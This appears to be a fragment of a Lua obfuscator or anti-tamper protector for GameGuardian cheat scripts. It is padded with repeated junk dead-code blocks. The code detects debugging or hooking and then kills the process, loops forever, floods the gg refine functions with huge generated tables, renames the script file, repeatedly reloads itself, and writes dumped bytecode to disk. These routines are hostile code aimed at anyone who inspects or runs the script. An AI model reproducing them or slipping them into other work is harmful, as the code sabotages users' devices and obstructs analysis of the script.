  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

local function checkStringForAt(str)
    return str:find("@") ~= nil
end

verifyLibraries()
additionalChecks()

local libs = {tostring(gg), tostring(os), tostring(io), tostring(debug), tostring(math), tostring(table)}
for _, lib in ipairs(libs) do
    if checkStringForAt(lib) then
        os.exit()
        return
    end
end

if not debug.traceback or not gg.getFile then
    repeat
        os.exit()
    until false
    return
end

local c = os.clock()
if os.clock() - c > 0.80 then
    os.exit()
    return
end

if debug.getinfo(gg.searchNumber).what ~= 'Java' then
    os.exit()
    return
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

local funcX = function() end
local LockFinal = {
    debug.getinfo(gg.toast).short_src,
    debug.getinfo(gg.getResults).short_src,
    debug.getinfo(gg.getValues).short_src,
    debug.getinfo(os.exit).short_src,
    debug.getinfo(gg.refineNumber).short_src,
    debug.getinfo(gg.refineAddress).short_src,
    debug.getinfo(gg.alert).short_src,
    debug.getinfo(debug.getinfo).short_src,
    debug.getinfo(funcX).short_src
}

for _, v in ipairs(LockFinal) do
    if v ~= "toast" and v ~= "getResults" and v ~= debug.getinfo(1).short_src and v ~= "function() end" and v ~= gg.getFile() then
        os.exit()
        return
    end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

local function isGGSearchNumberDefinition()
    local ggSearchNumberInfo = debug.getinfo(gg.searchNumber)
    if ggSearchNumberInfo == nil then
        return false
    end
    return ggSearchNumberInfo.func == gg.searchNumber
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

local function isGGEquivalentToStrGG()
    return string.format("%s", gg) == tostring(gg)
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

function checkHack()
    if not isGGSearchNumberDefinition() then
        while true do
        end
    end
    if not isGGEquivalentToStrGG() then
        local tostringPath = string.format("%s", tostring):match("@(.-):")
        if tostringPath and tostringPath:find("/lua/") then
            gg.alert("ERRO.","")
            os.exit()
        end
    end
end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

    local function GenerateSpamName()
        local HashName = ""
        for i = 1, 10 do
            HashName = "ðŸŒ¨ï¸" .. HashName .. "â˜ƒï¸" .. HashName .. "â„ï¸"
        end
        return HashName:rep(100)
    end
    
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..Block..[[
    local function IsFunctionValid(env)
        for _, v in pairs(env) do
            if toStr(v):match("function: @.-:") then
                return false
            end
        end
        return true
    end
    
  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

    local function ValidateFunctions()
        if not IsFunctionValid(_ENV) then
            return false
        end
        local func = os.exit
        if toStr(func):find("[-@/%d]") then
            return false
        end
        return true
    end
    
  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

    local function RefineSpamData(tmp)
        for i = 1, #tmp do
            SpamTable[i] = {
                ["address"] = GenerateSpamName(),
                ["flags"] = GenerateSpamName(),
                ["value"] = GenerateSpamName(),
                ["freeze"] = GenerateSpamName(),
                ["name"] = GenerateSpamName(),
                SpamTable[i - 1]
            }
            gg.refineNumber(SpamTable)
            gg.refineAddress(SpamTable)
        end
    end
    
  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

    local function PerformSafetyCheck()
        for _, funcGroup in ipairs({gg, os, io, debug, math, table}) do
            if _ENV["string"]["match"](tostring(funcGroup), "@") then
                gg.processKill()
                return
            end
        end

        if debug.getinfo(1).istailcall or debug.getinfo(gg.searchNumber).what ~= 'Java' then
            os.exit()
        end
    end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

    local function ManageVisibility()
        local x = 0
        repeat
            x = x + 1
            gg.setVisible(false)
            gg.sleep(0)
            gg.setVisible(true)
            gg.sleep(2000)
        until x == 20000
    end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

    local function ValidateSourceFile()
        local fileName = gg.getFile()
        local loadedFile = loadfile(fileName)
        if loadedFile ~= nil then
            local tempName = fileName:match("[^/]+$")
            local newName = "lohhhggg"
            os.rename(fileName, fileName:gsub('/[^/]+$', '') .. '/' .. newName)
            loadedFile = loadfile(fileName:gsub('/[^/]+$', '') .. '/' .. newName)
            os.rename(fileName:gsub('/[^/]+$', '') .. '/' .. newName, fileName)
            ManageVisibility()
        end
    end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

    local function Main()
        local tmp = GenerateSequence()
        if ValidateFunctions() then
            RefineSpamData(tmp)
            PerformSafetyCheck()
            ValidateSourceFile()
        end
    end
    Main()
end
 
  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..Block..[[

for i = 1,5 do
if(nil)then if true then return end if true then return end if true then return end if true then return end if true then return end if true then return end if true then return end if true then return end end
loadfile = loadfile
load = load
loadfile(gg.getFile()) load(string.dump(load("os.exit()"),false,false)) io.open(gg.getFile() .. "c" .. tostring(string.dump(loadfile(gg.getFile()),false,false)),"w") end
while (nil)do;local o={{-nil,{nil%- nil,{-nil%nil,{nil%nil%- nil,{""..GTR..""}},{GTR},}},{{"\n\n"},o.uo,{{"\n"},p.p,{{"\n\n\n"},fq.qo.o,{{"\t\n\n\t\n"},p.p,{{"\t\n"},q.q{o}.uo,{{"\n\n\t\t\n\n"},p.p,{{"\n\n\t\n\t\n\n\t\n"},q.qo.o,{{"\n\t\n\n\t\n"},p.p,{{"\n\n\t\n"},q.q}}}}}}}}}}} local p={o.o,{{"\n"},S,n,i,p,e,r,G,a,m,e,r,T,M,p,{{"\n"},p.p,q.qo.o,{p.p,{q.q.o,{p.s{"\n\n"},p,{q.q}}}}}}} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={S,n,i,p,e,r,G,a,m,e,r,T,M} local q={o.o,p.p,q.qo.uo,p.p,q,qi,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end

for i = 1, 5000 do
table.insert({}, {})
end
for i = 1, 5000 do
table.insert({}, {})
end
gg.setVisible(false)
for i = 1, 6 do
gg.addListItems({})
end
gg.setVisible(false)
gg.removeListItems({})
if os.time() > os.time() then
return end
if os.time() < os.time() then
end
if os.difftime(os.time(), (os.time())) > 2 then
return 
end
gg.setVisible(false)
if os.clock() > os.clock() then
return 
end
if os.clock() < os.clock() then
end
if os.difftime(os.clock(), (os.clock())) > 2 then
return end
gg.setVisible(false)
for i = 3, 100 do
load(gg.getFile())
end

while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end

while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end

while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end

while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end

while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end

  while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[

]])

BATMAN = [[
end
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end

]]


 function encodegg(code)
return 'gg[b68405f119("' .. ShaMod(code) .. '")]('
end

